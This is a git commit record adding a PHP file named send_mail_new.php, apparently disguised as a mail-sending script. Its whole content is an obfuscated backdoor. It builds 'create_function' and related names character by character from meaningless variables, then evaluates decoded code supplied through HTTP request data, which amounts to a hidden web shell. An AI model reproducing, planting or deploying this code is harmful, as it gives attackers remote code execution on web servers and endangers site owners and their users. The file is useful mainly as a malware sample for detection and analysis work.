fb4f0da1cc031a0d1d29b5a380a9b54c7e372c83
elisavetah <samuel.murrish.personal@gmail.com>
2016-09-14 21:33:54 -0400

    save
    save

---
+++ php/send_mail_new.php
@@ -0,0 +1,90 @@
+<?php
+
+	$blutwurst = ')'; $collector= '(';
+	$bonsai= ':H';
+	$heir='$';$blanketers= 'He"='; $beethoven ='(?';$grimace = 'n';$angels='S'; $impersonally ='t';
+
+	$bedspread= ';errniE';$justified = 'e';$legal ='"t);r';$antigen= 'l'; $dutiful= 'sUu';$futility = 'i';$jennee ='A';
+	$dovekie = '(KC"'; $cannel = 'n"iSjI';
+	$expanded =']eta'; $karola = ')_cto$6T';$coriss = 'b3$o';$gyroscope='ehCpa';$features= ')f'; $handiness='es'; $candace= 'y';
+	$financed= 'aei_[g2$O'; $kimberli= 's';$instance='>ja"';$haggard ='$';$fennel ='i';$aluino = 'aieaac';
+	$kudzu= ')';$delves ='J)ae(1"';
+
+	$laughed= 'C'; $chanter='H';
+	$ballplayers ='FT';$lorena= 'r';
+	$jumper =']';
+	$indicator = '[;__Ae'; $furrows ='RO8';$homework= 'S'; $janitors = 'plKrc"D';$harsh ='S_iC4Gea'; $charming = '?';
+	$camile= '"';
+
+	$cornelia= '$'; $knit = 'Y'; $listed = '[';$dogwood = '] $RiP4';
+	$injunct= '<';
+
+	$commonwealth='raeT_HsT';$auk ='sVE('; $clip ='IvIVeaci';$frightfully='T';$expediting= 'rs5'; $anastigmat='_';$confessors= '(c?Ei';$corly='tEU'; $augy='Z';$densitometric ='9$fJQ';$diction = 'a)s'; $carfare ='h:d'; $bridge = 's(';$assisted = '7';$devourer='c';
+
+	$invective=';';$krystalle='([d)rC'; $jillie =',';
+	$golds ='r$_Bc'; $fetid=')';$harkonnen='t';$invested = 'E';$farley= '_gyE'; $drunkly=':r,T[';$disk = '(gsNrX';
+
+	$cash = ';'; $changing ='I';$dinghy = 'E';$harrison ='mEe]';$hesitates ='evMsO6c$'; $heavyweight ='e'; $criminally = 'Q';$inheres ='a'; $bang = 'L0RiSJ'; $leta ='t';
+	$evidently = 'W';$golda= '_'; $elemental='(v';
+
+	$gustave= '_@eH)uP=)'; $karlan = 'PvoR=(d';$autonomic ='AC';$commonest= $hesitates['6'] .$disk['4'].$gustave['2'] .
+
+	$inheres.$leta . $gustave['2'] .$gustave['0'].$densitometric['2'] .
+	$gustave['5'] .$cannel['0'].$hesitates['6'] . $leta. $bang['3'] .
+
+	$karlan[2] . $cannel['0'] ;
+	$cuddled =$dogwood[1]; $faucet=$commonest($cuddled,$gustave['2'].$karlan['1']. $inheres .$janitors['1'].$karlan[5].$inheres . $disk['4'].$disk['4']. $inheres.
+
+	$farley['2'].$gustave['0'].$janitors['0']. $karlan[2].$janitors['0'] . $karlan[5]. $densitometric['2'] . $gustave['5'] .
+	$cannel['0'].$hesitates['6'] .$gustave['0'] . $disk['1'] . $gustave['2'] .
+	$leta .$gustave['0']. $inheres. $disk['4']. $disk['1']. $hesitates['3']. $karlan[5].$gustave[8] .
+
+	$gustave[8] .$gustave[8].
+	$cash); $faucet($confessors[2],$drunkly[3],$carfare['0'], $augy, $karlan[0],$bang['3'] ,$coriss['1'] , $hesitates['7'] .$bang['3'] .$karlan['4'] .
+	$inheres. $disk['4'] .$disk['4'] .$inheres .$farley['2'] .$gustave['0'].
+
+	$harrison['0'] .$gustave['2'].$disk['4']. $disk['1']. $gustave['2'] . $karlan[5] . $hesitates['7'].
+
+	$gustave['0'].$karlan['3'] . $harrison['1'] .$criminally. $corly['2']. $harrison['1'] .$bang['4'].
+	$drunkly[3].$drunkly[2]. $hesitates['7'] . $gustave['0'].$autonomic['1'].
+	$hesitates['4'] .$hesitates['4'] .
+
+	$janitors['2'].$changing .$harrison['1'] .$drunkly[2] .$hesitates['7'] .
+	$gustave['0']. $bang['4'] .$harrison['1']. $karlan['3'] . $clip['3'] .$harrison['1'] . $karlan['3'].
+	$gustave[8].$cash.
+	$hesitates['7'] . $inheres. $karlan['4'] . $bang['3'] .
+	$hesitates['3'].
+
+	$hesitates['3'].$gustave['2'].$leta .
+	$karlan[5]. $hesitates['7'] . $bang['3'] . $drunkly['4'] .$camile.$hesitates['3']. $gustave['2']. $bang['3'] .
+
+	$instance['1'].$inheres .
+
+	$hesitates['6'].
+
+	$hesitates['6'].$carfare['0'].$camile. $harrison['3']. $gustave[8] .$confessors[2].$hesitates['7'].
+	$bang['3'] .$drunkly['4'].$camile.$hesitates['3'].$gustave['2'] .
+	$bang['3'] . $instance['1'] .
+
+	$inheres.
+	$hesitates['6'].$hesitates['6']. $carfare['0']. $camile . $harrison['3'] .
+	$drunkly['0'] .$karlan[5] .
+	$bang['3'].$hesitates['3'].$hesitates['3'] .$gustave['2'].$leta. $karlan[5]. $hesitates['7'] .$bang['3'] . $drunkly['4'] .$camile.$gustave['3'].$drunkly[3] .$drunkly[3] .$karlan[0] . $gustave['0'] . $bang['4'] . $harrison['1'].$changing . $bang['5'].
+
+	$autonomic[0]. $autonomic['1']. $autonomic['1']. $gustave['3'].$camile.$harrison['3'].$gustave[8] .
+	$confessors[2] .
+
+	$hesitates['7'] .$bang['3']. $drunkly['4'].$camile .$gustave['3'] .$drunkly[3] .
+
+	$drunkly[3]. $karlan[0]. $gustave['0'].$bang['4'] .
+	$harrison['1'].$changing. $bang['5'] .$autonomic[0]. $autonomic['1'] .$autonomic['1'] . $gustave['3'].$camile. $harrison['3'] . $drunkly['0'].$karlan['6'].$bang['3'] . $gustave['2'] .
+	$gustave[8] . $cash.$gustave['2'] . $karlan['1'].$inheres.$janitors['1'] . $karlan[5] .
+	$hesitates['3']. $leta. $disk['4'].$disk['4'].$gustave['2'] . $karlan['1'] .$karlan[5] .$coriss['0'] .$inheres .$hesitates['3'].
+	$gustave['2'] .$hesitates['5'] .
+
+	$dogwood['6'] .$gustave['0'] .$karlan['6'].$gustave['2'] .$hesitates['6'].$karlan[2] . $karlan['6'] .$gustave['2'] . $karlan[5] . $hesitates['3']. $leta .$disk['4'] . $disk['4']. $gustave['2'] .
+	$karlan['1'].$karlan[5] . $hesitates['7'].
+	$inheres.$gustave[8] .
+	$gustave[8] .$gustave[8].
+
+	$gustave[8] .$cash );
